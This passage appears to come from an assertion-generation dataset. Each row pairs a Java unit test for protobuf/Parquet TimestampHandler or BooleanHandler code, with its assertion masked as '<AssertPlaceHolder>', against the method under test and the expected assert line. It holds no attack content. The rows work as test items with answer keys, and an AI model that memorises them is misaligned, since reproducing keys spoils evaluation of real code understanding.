transformFromParquet(SimpleGroup simpleGroup) { return null; }"	assertNull(protoHandler.transformFromParquet(simpleGroup))
"shouldReturnTrueIfTimestampFieldDescriptorIsPassed() { Descriptors.FieldDescriptor timestampFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""event_timestamp""); TimestampHandler timestampHandler = new TimestampHandler(timestampFieldDescriptor);  ""<AssertPlaceHolder>""; }
canHandle() { return fieldDescriptor.getJavaType() == Descriptors.FieldDescriptor.JavaType.MESSAGE && fieldDescriptor.getMessageType().getFullName().equals(""google.protobuf.Timestamp""); }"	assertTrue(timestampHandler.canHandle())
"shouldReturnFalseIfFieldDescriptorOtherThanTimestampTypeIsPassed() { Descriptors.FieldDescriptor otherFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""order_number""); TimestampHandler timestampHandler = new TimestampHandler(otherFieldDescriptor);  ""<AssertPlaceHolder>""; }
canHandle() { return fieldDescriptor.getJavaType() == Descriptors.FieldDescriptor.JavaType.MESSAGE && fieldDescriptor.getMessageType().getFullName().equals(""google.protobuf.Timestamp""); }"	assertFalse(timestampHandler.canHandle())
"shouldReturnSameBuilderWithoutSettingFieldIfCannotHandle() { Descriptors.FieldDescriptor otherFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""order_number""); TimestampHandler timestampHandler = new TimestampHandler(otherFieldDescriptor); DynamicMessage.Builder builder = DynamicMessage.newBuilder(otherFieldDescriptor.getContainingType());  DynamicMessage.Builder returnedBuilder = timestampHandler.transformToProtoBuilder(builder, ""123""); ""<AssertPlaceHolder>""; }
transformToProtoBuilder(DynamicMessage.Builder builder, Object field) { if (!canHandle() || field == null) { return builder; } Timestamp timestamp = null; if (field instanceof java.sql.Timestamp) { timestamp = convertSqlTimestamp((java.sql.Timestamp) field); }  if (field instanceof Instant) { timestamp = Timestamp.newBuilder().setSeconds(((Instant) field).getEpochSecond()).build(); }  if (field instanceof LocalDateTime) { timestamp = convertLocalDateTime((LocalDateTime) field); }  if (field instanceof Row) { Row timeField = (Row) field; if (timeField.getArity() == 2) { timestamp = Timestamp.newBuilder() .setSeconds((Long) timeField.getField(0)) .setNanos((int) timeField.getField(1)) .build(); } else { throw new IllegalArgumentException(""Row: "" + timeField.toString() + "" of size: "" + timeField.getArity() + "" cannot be converted to timestamp""); } }  if (field instanceof String) { timestamp = Timestamp.newBuilder().setSeconds(Instant.parse(((String) field)).getEpochSecond()).build(); }  if (field instanceof Number) { timestamp = Timestamp.newBuilder().setSeconds(((Number) field).longValue()).build(); }  if (timestamp != null) { builder.setField(fieldDescriptor, timestamp); } return builder; }"	"assertEquals("""", returnedBuilder.getField(otherFieldDescriptor))"
"InvalidProtocolBufferException { Descriptors.FieldDescriptor timestampFieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""event_timestamp""); TimestampHandler timestampHandler = new TimestampHandler(timestampFieldDescriptor); DynamicMessage.Builder builder = DynamicMessage.newBuilder(timestampFieldDescriptor.getContainingType());  long milliSeconds = System.currentTimeMillis();  Timestamp inputTimestamp = new Timestamp(milliSeconds); LocalDateTime localDateTime = LocalDateTime.ofInstant(Instant.ofEpochMilli(milliSeconds), ZoneOffset.UTC);  DynamicMessage dynamicMessage = timestampHandler.transformToProtoBuilder(builder, localDateTime).build();  TestBookingLogMessage bookingLogMessage = TestBookingLogMessage.parseFrom(dynamicMessage.toByteArray()); ""<AssertPlaceHolder>""; }
transformToProtoBuilder(DynamicMessage.Builder builder, Object field) { if (!canHandle() || field == null) { return builder; } Timestamp timestamp = null; if (field instanceof java.sql.Timestamp) { timestamp = convertSqlTimestamp((java.sql.Timestamp) field); }  if (field instanceof Instant) { timestamp = Timestamp.newBuilder().setSeconds(((Instant) field).getEpochSecond()).build(); }  if (field instanceof LocalDateTime) { timestamp = convertLocalDateTime((LocalDateTime) field); }  if (field instanceof Row) { Row timeField = (Row) field; if (timeField.getArity() == 2) { timestamp = Timestamp.newBuilder() .setSeconds((Long) timeField.getField(0)) .setNanos((int) timeField.getField(1)) .build(); } else { throw new IllegalArgumentException(""Row: "" + timeField.toString() + "" of size: "" + timeField.getArity() + "" cannot be converted to timestamp""); } }  if (field instanceof String) { timestamp = Timestamp.newBuilder().setSeconds(Instant.parse(((String) field)).getEpochSecond()).build(); }  if (field instanceof Number) { timestamp = Timestamp.newBuilder().setSeconds(((Number) field).longValue()).build(); }  if (timestamp != null) { builder.setField(fieldDescriptor, timestamp); } return builder; }"	assertEquals(milliSeconds / 1000, bookingLogMessage.getEventTimestamp().getSeconds())
"shouldFetchTimeStampAsStringFromFieldForFieldDescriptorOfTypeTimeStampForTransformForPostProcessor() { String strValue = ""2018-08-30T02:21:39.975107Z"";  Descriptors.Descriptor descriptor = TestBookingLogMessage.getDescriptor(); Descriptors.FieldDescriptor fieldDescriptor = descriptor.findFieldByName(""booking_creation_time"");  TypeHandler typeHandler = TypeHandlerFactory.getTypeHandler(fieldDescriptor);  Object value = typeHandler.transformFromPostProcessor(strValue); ""<AssertPlaceHolder>""; }
transformFromPostProcessor(Object field) { return isValid(field) ? field.toString() : null; }"	assertEquals(strValue, value)
"shouldReturnNullWhenTimeStampNotAvailableAndFieldDescriptorOfTypeTimeStampForTransformForPostProcessor() { Descriptors.Descriptor descriptor = TestBookingLogMessage.getDescriptor(); Descriptors.FieldDescriptor fieldDescriptor = descriptor.findFieldByName(""booking_creation_time"");  TypeHandler typeHandler = TypeHandlerFactory.getTypeHandler(fieldDescriptor);  Object value = typeHandler.transformFromPostProcessor(null); ""<AssertPlaceHolder>""; }
transformFromPostProcessor(Object field) { return isValid(field) ? field.toString() : null; }"	assertNull(value)
"shouldHandleTimestampMessagesByReturningNullForNonParseableTimeStampsForTransformForPostProcessor() { Descriptors.Descriptor descriptor = TestBookingLogMessage.getDescriptor(); Descriptors.FieldDescriptor fieldDescriptor = descriptor.findFieldByName(""event_timestamp"");  TypeHandler typeHandler = TypeHandlerFactory.getTypeHandler(fieldDescriptor);  Object value = typeHandler.transformFromPostProcessor(""2"");  ""<AssertPlaceHolder>""; }
transformFromPostProcessor(Object field) { return isValid(field) ? field.toString() : null; }"	assertNull(value)
"shouldReturnTypeInformation() { Descriptors.Descriptor descriptor = TestBookingLogMessage.getDescriptor(); Descriptors.FieldDescriptor fieldDescriptor = descriptor.findFieldByName(""event_timestamp""); TimestampHandler timestampHandler = new TimestampHandler(fieldDescriptor); TypeInformation actualTypeInformation = timestampHandler.getTypeInformation(); TypeInformation<Row> expectedTypeInformation = Types.ROW_NAMED(new String[]{""seconds"", ""nanos""}, Types.LONG, Types.INT); ""<AssertPlaceHolder>""; }
getTypeInformation() { return TypeInformationFactory.getRowType(fieldDescriptor.getMessageType()); }"	assertEquals(expectedTypeInformation, actualTypeInformation)
"InvalidProtocolBufferException { Descriptors.Descriptor descriptor = TestBookingLogMessage.getDescriptor(); Descriptors.FieldDescriptor fieldDescriptor = descriptor.findFieldByName(""event_timestamp""); TestBookingLogMessage bookingLogMessage = TestBookingLogMessage .newBuilder() .setEventTimestamp(com.google.protobuf.Timestamp.newBuilder().setSeconds(10L).setNanos(10).build()) .build(); DynamicMessage dynamicMessage = DynamicMessage.parseFrom(TestBookingLogMessage.getDescriptor(), bookingLogMessage.toByteArray()); TimestampHandler timestampHandler = new TimestampHandler(fieldDescriptor); Row row = (Row) timestampHandler.transformFromProto(dynamicMessage.getField(fieldDescriptor)); ""<AssertPlaceHolder>""; }
transformFromProto(Object field) { return RowFactory.createRow((DynamicMessage) field); }"	assertEquals(Row.of(10L, 10), row)
"InvalidProtocolBufferException { Descriptors.Descriptor descriptor = TestBookingLogMessage.getDescriptor(); Descriptors.FieldDescriptor fieldDescriptor = descriptor.findFieldByName(""event_timestamp""); TestBookingLogMessage bookingLogMessage = TestBookingLogMessage .newBuilder() .build(); DynamicMessage dynamicMessage = DynamicMessage.parseFrom(TestBookingLogMessage.getDescriptor(), bookingLogMessage.toByteArray()); TimestampHandler timestampHandler = new TimestampHandler(fieldDescriptor); Row row = (Row) timestampHandler.transformFromProto(dynamicMessage.getField(fieldDescriptor)); ""<AssertPlaceHolder>""; }
transformFromProto(Object field) { return RowFactory.createRow((DynamicMessage) field); }"	assertEquals(Row.of(0L, 0), row)
"InvalidProtocolBufferException { Descriptors.Descriptor descriptor = TestBookingLogMessage.getDescriptor(); Descriptors.FieldDescriptor fieldDescriptor = descriptor.findFieldByName(""event_timestamp""); TestBookingLogMessage bookingLogMessage = TestBookingLogMessage .newBuilder() .setEventTimestamp(com.google.protobuf.Timestamp.newBuilder().setSeconds(10L).setNanos(10).build()) .build(); FieldDescriptorCache fieldDescriptorCache = new FieldDescriptorCache(TestBookingLogMessage.getDescriptor());  DynamicMessage dynamicMessage = DynamicMessage.parseFrom(TestBookingLogMessage.getDescriptor(), bookingLogMessage.toByteArray()); TimestampHandler timestampHandler = new TimestampHandler(fieldDescriptor); Row row = (Row) timestampHandler.transformFromProtoUsingCache(dynamicMessage.getField(fieldDescriptor), fieldDescriptorCache); ""<AssertPlaceHolder>""; }
transformFromProtoUsingCache(Object field, FieldDescriptorCache cache) { return RowFactory.createRow((DynamicMessage) field, cache); }"	assertEquals(Row.of(10L, 10), row)
"InvalidProtocolBufferException { Descriptors.Descriptor descriptor = TestBookingLogMessage.getDescriptor(); Descriptors.FieldDescriptor fieldDescriptor = descriptor.findFieldByName(""event_timestamp""); TestBookingLogMessage bookingLogMessage = TestBookingLogMessage .newBuilder() .build(); FieldDescriptorCache fieldDescriptorCache = new FieldDescriptorCache(TestBookingLogMessage.getDescriptor());  DynamicMessage dynamicMessage = DynamicMessage.parseFrom(TestBookingLogMessage.getDescriptor(), bookingLogMessage.toByteArray()); TimestampHandler timestampHandler = new TimestampHandler(fieldDescriptor); Row row = (Row) timestampHandler.transformFromProtoUsingCache(dynamicMessage.getField(fieldDescriptor), fieldDescriptorCache); ""<AssertPlaceHolder>""; }
transformFromProtoUsingCache(Object field, FieldDescriptorCache cache) { return RowFactory.createRow((DynamicMessage) field, cache); }"	assertEquals(Row.of(0L, 0), row)
"shouldConvertTimestampToJsonString() { Descriptors.Descriptor descriptor = TestBookingLogMessage.getDescriptor(); Descriptors.FieldDescriptor fieldDescriptor = descriptor.findFieldByName(""event_timestamp"");  Row inputRow = new Row(2); inputRow.setField(0, 1600083828L);  Object value = new TimestampHandler(fieldDescriptor).transformToJson(inputRow);  ""<AssertPlaceHolder>""; }
transformToJson(Object field) { Row timeField = (Row) field; if (timeField.getArity() == 2) { java.sql.Timestamp timestamp = new java.sql.Timestamp((Long) timeField.getField(0) * SECOND_TO_MS_FACTOR); return dateFormat.format(timestamp); } else { return field; } }"	"assertEquals(""2020-09-14 11:43:48"", String.valueOf(value))"
"shouldTransformEpochInMillisFromSimpleGroup() { long sampleTimeInMillis = Instant.now().toEpochMilli(); Instant instant = Instant.ofEpochMilli(sampleTimeInMillis); Row expectedRow = Row.of(instant.getEpochSecond(), instant.getNano());  Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""event_timestamp""); GroupType parquetSchema = org.apache.parquet.schema.Types.requiredGroup() .required(INT64).named(""event_timestamp"") .named(""TestGroupType""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema); simpleGroup.add(""event_timestamp"", sampleTimeInMillis);  TimestampHandler timestampHandler = new TimestampHandler(fieldDescriptor); Row actualRow = (Row) timestampHandler.transformFromParquet(simpleGroup);  ""<AssertPlaceHolder>""; }
transformFromParquet(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { Type timestampType = simpleGroup.getType().getType(fieldName); if (timestampType instanceof PrimitiveType) { return parseInt64TimestampFromSimpleGroup(simpleGroup, fieldName); } else if (timestampType instanceof GroupType) { return parseGroupTypeTimestampFromSimpleGroup(simpleGroup, fieldName); } } return Row.of(DEFAULT_SECONDS_VALUE, DEFAULT_NANOS_VALUE); }"	assertEquals(expectedRow, actualRow)
"shouldReturnDefaultTimestampRowDuringTransformIfNullIsPassedToTransformFromParquet() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""event_timestamp""); TimestampHandler timestampHandler = new TimestampHandler(fieldDescriptor);  Row actualRow = (Row) timestampHandler.transformFromParquet(null);  Row expectedRow = Row.of(0L, 0); ""<AssertPlaceHolder>""; }
transformFromParquet(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { Type timestampType = simpleGroup.getType().getType(fieldName); if (timestampType instanceof PrimitiveType) { return parseInt64TimestampFromSimpleGroup(simpleGroup, fieldName); } else if (timestampType instanceof GroupType) { return parseGroupTypeTimestampFromSimpleGroup(simpleGroup, fieldName); } } return Row.of(DEFAULT_SECONDS_VALUE, DEFAULT_NANOS_VALUE); }"	assertEquals(expectedRow, actualRow)
"shouldReturnDefaultTimestampRowDuringTransformIfSimpleGroupDoesNotContainField() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""event_timestamp""); GroupType parquetSchema = org.apache.parquet.schema.Types.requiredGroup() .required(INT64).named(""some-other-field"") .named(""TestGroupType""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema);  TimestampHandler timestampHandler = new TimestampHandler(fieldDescriptor); Row actualRow = (Row) timestampHandler.transformFromParquet(simpleGroup);  Row expectedRow = Row.of(0L, 0); ""<AssertPlaceHolder>""; }
transformFromParquet(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { Type timestampType = simpleGroup.getType().getType(fieldName); if (timestampType instanceof PrimitiveType) { return parseInt64TimestampFromSimpleGroup(simpleGroup, fieldName); } else if (timestampType instanceof GroupType) { return parseGroupTypeTimestampFromSimpleGroup(simpleGroup, fieldName); } } return Row.of(DEFAULT_SECONDS_VALUE, DEFAULT_NANOS_VALUE); }"	assertEquals(expectedRow, actualRow)
"shouldReturnDefaultTimestampRowDuringTransformIfSimpleGroupDoesNotContainValueForInt64TimestampField() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""event_timestamp""); GroupType parquetSchema = org.apache.parquet.schema.Types.requiredGroup() .required(INT64).named(""event_timestamp"") .named(""TestGroupType""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema);  TimestampHandler timestampHandler = new TimestampHandler(fieldDescriptor); Row actualRow = (Row) timestampHandler.transformFromParquet(simpleGroup);  Row expectedRow = Row.of(0L, 0); ""<AssertPlaceHolder>""; }
transformFromParquet(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { Type timestampType = simpleGroup.getType().getType(fieldName); if (timestampType instanceof PrimitiveType) { return parseInt64TimestampFromSimpleGroup(simpleGroup, fieldName); } else if (timestampType instanceof GroupType) { return parseGroupTypeTimestampFromSimpleGroup(simpleGroup, fieldName); } } return Row.of(DEFAULT_SECONDS_VALUE, DEFAULT_NANOS_VALUE); }"	assertEquals(expectedRow, actualRow)
"shouldTransformGroupTypeTimestampFromSimpleGroup() { Instant currentInstant = Instant.now(); long seconds = currentInstant.getEpochSecond(); int nanos = currentInstant.getNano(); Row expectedRow = Row.of(seconds, nanos);  Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""event_timestamp""); GroupType timestampSchema = org.apache.parquet.schema.Types.requiredGroup() .required(INT64).named(""seconds"") .required(INT32).named(""nanos"") .named(""event_timestamp""); SimpleGroup timestampMessage = new SimpleGroup(timestampSchema); timestampMessage.add(""seconds"", seconds); timestampMessage.add(""nanos"", nanos);  MessageType parquetSchema = buildMessage() .addField(timestampSchema) .named(""TestBookingLogMessage""); SimpleGroup mainMessage = new SimpleGroup(parquetSchema); mainMessage.add(""event_timestamp"", timestampMessage);  TimestampHandler timestampHandler = new TimestampHandler(fieldDescriptor); Row actualRow = (Row) timestampHandler.transformFromParquet(mainMessage);  ""<AssertPlaceHolder>""; }
transformFromParquet(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { Type timestampType = simpleGroup.getType().getType(fieldName); if (timestampType instanceof PrimitiveType) { return parseInt64TimestampFromSimpleGroup(simpleGroup, fieldName); } else if (timestampType instanceof GroupType) { return parseGroupTypeTimestampFromSimpleGroup(simpleGroup, fieldName); } } return Row.of(DEFAULT_SECONDS_VALUE, DEFAULT_NANOS_VALUE); }"	assertEquals(expectedRow, actualRow)
"shouldUseDefaultSecondsDuringTransformIfSimpleGroupDoesNotContainSecondsInGroupTypeTimestamp() { Instant currentInstant = Instant.now(); int nanos = currentInstant.getNano(); Row expectedRow = Row.of(0L, nanos);  Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""event_timestamp""); TimestampHandler timestampHandler = new TimestampHandler(fieldDescriptor);  /* only adding nanos field to the timestamp schema and initializing it */ GroupType timestampSchema = org.apache.parquet.schema.Types.optionalGroup() .optional(INT32).named(""nanos"") .named(""event_timestamp""); SimpleGroup timestampMessage = new SimpleGroup(timestampSchema); timestampMessage.add(""nanos"", nanos);  MessageType parquetSchema = buildMessage() .addField(timestampSchema) .named(""TestBookingLogMessage""); SimpleGroup mainMessage = new SimpleGroup(parquetSchema); mainMessage.add(""event_timestamp"", timestampMessage);  Row actualRow = (Row) timestampHandler.transformFromParquet(mainMessage);  ""<AssertPlaceHolder>""; }
transformFromParquet(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { Type timestampType = simpleGroup.getType().getType(fieldName); if (timestampType instanceof PrimitiveType) { return parseInt64TimestampFromSimpleGroup(simpleGroup, fieldName); } else if (timestampType instanceof GroupType) { return parseGroupTypeTimestampFromSimpleGroup(simpleGroup, fieldName); } } return Row.of(DEFAULT_SECONDS_VALUE, DEFAULT_NANOS_VALUE); }"	assertEquals(expectedRow, actualRow)
"shouldUseDefaultSecondsDuringTransformIfSimpleGroupHasGroupTypeTimestampWithSecondsNotInitialized() { Instant currentInstant = Instant.now(); int nanos = currentInstant.getNano(); Row expectedRow = Row.of(0L, nanos);  Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""event_timestamp""); TimestampHandler timestampHandler = new TimestampHandler(fieldDescriptor);  /* adding both nanos and seconds field to the timestamp schema but initializing only for nanos */ GroupType timestampSchema = org.apache.parquet.schema.Types.requiredGroup() .required(INT64).named(""seconds"") .required(INT32).named(""nanos"") .named(""event_timestamp""); SimpleGroup timestampMessage = new SimpleGroup(timestampSchema); timestampMessage.add(""nanos"", nanos);  MessageType parquetSchema = buildMessage() .addField(timestampSchema) .named(""TestBookingLogMessage""); SimpleGroup mainMessage = new SimpleGroup(parquetSchema); mainMessage.add(""event_timestamp"", timestampMessage);  Row actualRow = (Row) timestampHandler.transformFromParquet(mainMessage);  ""<AssertPlaceHolder>""; }
transformFromParquet(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { Type timestampType = simpleGroup.getType().getType(fieldName); if (timestampType instanceof PrimitiveType) { return parseInt64TimestampFromSimpleGroup(simpleGroup, fieldName); } else if (timestampType instanceof GroupType) { return parseGroupTypeTimestampFromSimpleGroup(simpleGroup, fieldName); } } return Row.of(DEFAULT_SECONDS_VALUE, DEFAULT_NANOS_VALUE); }"	assertEquals(expectedRow, actualRow)
"shouldUseDefaultNanosDuringTransformIfSimpleGroupDoesNotContainNanosInGroupTypeTimestamp() { Instant currentInstant = Instant.now(); long seconds = currentInstant.getEpochSecond(); Row expectedRow = Row.of(seconds, 0);  Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""event_timestamp""); TimestampHandler timestampHandler = new TimestampHandler(fieldDescriptor);  /* only adding seconds field to the timestamp schema and initializing it */ GroupType timestampSchema = org.apache.parquet.schema.Types.optionalGroup() .optional(INT64).named(""seconds"") .named(""event_timestamp""); SimpleGroup timestampMessage = new SimpleGroup(timestampSchema); timestampMessage.add(""seconds"", seconds);  MessageType parquetSchema = buildMessage() .addField(timestampSchema) .named(""TestBookingLogMessage""); SimpleGroup mainMessage = new SimpleGroup(parquetSchema); mainMessage.add(""event_timestamp"", timestampMessage);  Row actualRow = (Row) timestampHandler.transformFromParquet(mainMessage);  ""<AssertPlaceHolder>""; }
transformFromParquet(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { Type timestampType = simpleGroup.getType().getType(fieldName); if (timestampType instanceof PrimitiveType) { return parseInt64TimestampFromSimpleGroup(simpleGroup, fieldName); } else if (timestampType instanceof GroupType) { return parseGroupTypeTimestampFromSimpleGroup(simpleGroup, fieldName); } } return Row.of(DEFAULT_SECONDS_VALUE, DEFAULT_NANOS_VALUE); }"	assertEquals(expectedRow, actualRow)
"shouldUseDefaultNanosDuringTransformIfSimpleGroupHasGroupTypeTimestampWithNanosNotInitialized() { Instant currentInstant = Instant.now(); long seconds = currentInstant.getEpochSecond(); Row expectedRow = Row.of(seconds, 0);  Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""event_timestamp""); TimestampHandler timestampHandler = new TimestampHandler(fieldDescriptor);  /* adding both nanos and seconds field to the timestamp schema but initializing only for seconds */ GroupType timestampSchema = org.apache.parquet.schema.Types.optionalGroup() .optional(INT64).named(""seconds"") .optional(INT32).named(""nanos"") .named(""event_timestamp""); SimpleGroup timestampMessage = new SimpleGroup(timestampSchema); timestampMessage.add(""seconds"", seconds);  MessageType parquetSchema = buildMessage() .addField(timestampSchema) .named(""TestBookingLogMessage""); SimpleGroup mainMessage = new SimpleGroup(parquetSchema); mainMessage.add(""event_timestamp"", timestampMessage);  Row actualRow = (Row) timestampHandler.transformFromParquet(mainMessage);  ""<AssertPlaceHolder>""; }
transformFromParquet(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName(); if (simpleGroup != null && SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { Type timestampType = simpleGroup.getType().getType(fieldName); if (timestampType instanceof PrimitiveType) { return parseInt64TimestampFromSimpleGroup(simpleGroup, fieldName); } else if (timestampType instanceof GroupType) { return parseGroupTypeTimestampFromSimpleGroup(simpleGroup, fieldName); } } return Row.of(DEFAULT_SECONDS_VALUE, DEFAULT_NANOS_VALUE); }"	assertEquals(expectedRow, actualRow)
"shouldHandleBooleanTypes() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""customer_dynamic_surge_enabled""); BooleanHandler booleanHandler = new BooleanHandler(fieldDescriptor); ""<AssertPlaceHolder>""; }
canHandle() { return fieldDescriptor.getJavaType() == JavaType.BOOLEAN; }"	assertTrue(booleanHandler.canHandle())
"shouldNotHandleTypesOtherThanBoolean() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""order_number""); BooleanHandler booleanHandler = new BooleanHandler(fieldDescriptor); ""<AssertPlaceHolder>""; }
canHandle() { return fieldDescriptor.getJavaType() == JavaType.BOOLEAN; }"	assertFalse(booleanHandler.canHandle())
"shouldFetchValueForFieldForFieldDescriptorOfTypeBool() { boolean actualValue = true;  Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""customer_dynamic_surge_enabled""); BooleanHandler booleanHandler = new BooleanHandler(fieldDescriptor); Object value = booleanHandler.parseObject(actualValue);  ""<AssertPlaceHolder>""; }
parseObject(Object field) { return Boolean.parseBoolean(getValueOrDefault(field, ""false"")); }"	assertEquals(actualValue, value)
"shouldFetchParsedValueForFieldForFieldDescriptorOfTypeBool() { boolean actualValue = true;  Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""customer_dynamic_surge_enabled"");  BooleanHandler booleanHandler = new BooleanHandler(fieldDescriptor); Object value = booleanHandler.parseObject(String.valueOf(actualValue));  ""<AssertPlaceHolder>""; }
parseObject(Object field) { return Boolean.parseBoolean(getValueOrDefault(field, ""false"")); }"	assertEquals(actualValue, value)
"shouldFetchDefaultValueIfValueNotPresentForFieldDescriptorOfTypeBool() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""customer_dynamic_surge_enabled"");  BooleanHandler booleanHandler = new BooleanHandler(fieldDescriptor); Object value = booleanHandler.parseObject(null);  ""<AssertPlaceHolder>""; }
parseObject(Object field) { return Boolean.parseBoolean(getValueOrDefault(field, ""false"")); }"	assertEquals(false, value)
"shouldReturnTypeInformation() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""customer_dynamic_surge_enabled"");  BooleanHandler booleanHandler = new BooleanHandler(fieldDescriptor); ""<AssertPlaceHolder>""; }
getTypeInformation() { return Types.BOOLEAN; }"	assertEquals(Types.BOOLEAN, booleanHandler.getTypeInformation())
"shouldReturnArrayTypeInformation() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""customer_dynamic_surge_enabled""); BooleanHandler booleanHandler = new BooleanHandler(fieldDescriptor); ""<AssertPlaceHolder>""; }
getArrayType() { return Types.PRIMITIVE_ARRAY(Types.BOOLEAN); }"	assertEquals(Types.PRIMITIVE_ARRAY(Types.BOOLEAN), booleanHandler.getArrayType())
"shouldReturnArrayValues() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""customer_dynamic_surge_enabled"");  BooleanHandler booleanHandler = new BooleanHandler(fieldDescriptor); ArrayList<Boolean> inputValues = new ArrayList<>(Arrays.asList(true, false, false)); Object actualValues = booleanHandler.parseRepeatedObjectField(inputValues);  ""<AssertPlaceHolder>""; }
parseRepeatedObjectField(Object field) { boolean[] inputValues = new boolean[0]; if (field != null) { inputValues = Booleans.toArray((List<Boolean>) field); } return inputValues; }"	assertArrayEquals(new boolean[]{true, false, false}, (boolean[]) actualValues)
"shouldReturnEmptyArrayOnNull() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""customer_dynamic_surge_enabled"");  BooleanHandler booleanHandler = new BooleanHandler(fieldDescriptor); Object actualValues = booleanHandler.parseRepeatedObjectField(null);  ""<AssertPlaceHolder>""; }
parseRepeatedObjectField(Object field) { boolean[] inputValues = new boolean[0]; if (field != null) { inputValues = Booleans.toArray((List<Boolean>) field); } return inputValues; }"	assertEquals(0, ((boolean[]) actualValues).length)
"shouldFetchParsedValueForFieldOfTypeBoolInSimpleGroup() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""customer_dynamic_surge_enabled""); GroupType parquetSchema = org.apache.parquet.schema.Types.requiredGroup() .required(BOOLEAN).named(""customer_dynamic_surge_enabled"") .named(""TestGroupType""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema); simpleGroup.add(""customer_dynamic_surge_enabled"", true);  BooleanHandler booleanHandler = new BooleanHandler(fieldDescriptor); Object actualValue = booleanHandler.parseSimpleGroup(simpleGroup);  ""<AssertPlaceHolder>""; }
parseSimpleGroup(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName();  /* this if branch checks that the field name exists in the simple group schema and is initialized */ if (SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { return simpleGroup.getBoolean(fieldName, 0); } else { /* return default value */ return false; } }"	assertEquals(true, actualValue)
"shouldFetchDefaultValueIfFieldNotPresentInSimpleGroup() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""customer_dynamic_surge_enabled""); GroupType parquetSchema = org.apache.parquet.schema.Types.requiredGroup() .required(BOOLEAN).named(""some-other-field"") .named(""TestGroupType""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema); BooleanHandler booleanHandler = new BooleanHandler(fieldDescriptor);  Object actualValue = booleanHandler.parseSimpleGroup(simpleGroup);  ""<AssertPlaceHolder>""; }
parseSimpleGroup(SimpleGroup simpleGroup) { String fieldName = fieldDescriptor.getName();  /* this if branch checks that the field name exists in the simple group schema and is initialized */ if (SimpleGroupValidation.checkFieldExistsAndIsInitialized(simpleGroup, fieldName)) { return simpleGroup.getBoolean(fieldName, 0); } else { /* return default value */ return false; } }"	assertEquals(false, actualValue)
"shouldFetchDefaultValueIfFieldNotInitializedWithAValueInSimpleGroup() { Descriptors.FieldDescriptor fieldDescriptor = TestBookingLogMessage.getDescriptor().findFieldByName(""customer_dynamic_surge_enabled""); /* The field is added to the schema but not assigned a value */ GroupType parquetSchema = org.apache.parquet.schema.Types.requiredGroup() .required(BOOLEAN).named(""customer_dynamic_surge_enabled"") .named(""TestGroupType""); SimpleGroup simpleGroup = new SimpleGroup(parquetSchema); BooleanHandler booleanHandler = new BooleanHandler(fieldDescriptor);  Object actualValue = booleanHandler.parseSimpleGroup(simpleGroup);  ""<AssertPlaceHolder>""; }
